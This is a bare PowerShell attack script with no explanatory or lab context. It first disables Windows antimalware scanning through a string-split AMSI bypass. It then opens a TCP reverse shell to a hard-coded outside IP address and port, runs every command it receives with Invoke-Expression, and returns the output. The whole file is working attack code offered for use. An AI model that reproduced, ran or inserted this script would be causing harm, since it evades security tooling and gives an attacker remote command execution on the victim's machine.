# == NUTS AND BALLS == #

$a = "AmsiUtils"
$b = "System.Man" + "agement.Automation." + $a
[Ref].Assembly.GetType($b).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$ip = "86.134.165.94"
$port = 60068

function Connect {
    try {
        $c = New-Object System.Net.Sockets.TcpClient($ip, $port)
        $s = $c.GetStream()
        $b = New-Object Byte[] 1024
        $enc = [System.Text.Encoding]::UTF8

        while ($c.Connected) {
            $len = $s.Read($b, 0, 1024)
            if ($len -le 0) { break }
            $cmd = $enc.GetString($b, 0, $len)
            if ($cmd.Trim().ToLower() -eq "exit") { break }
            $out = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
            $res = $enc.GetBytes($out)
            $s.Write($res, 0, $res.Length)
        }

        $s.Close()
        $c.Close()
    } catch {}
}

Connect
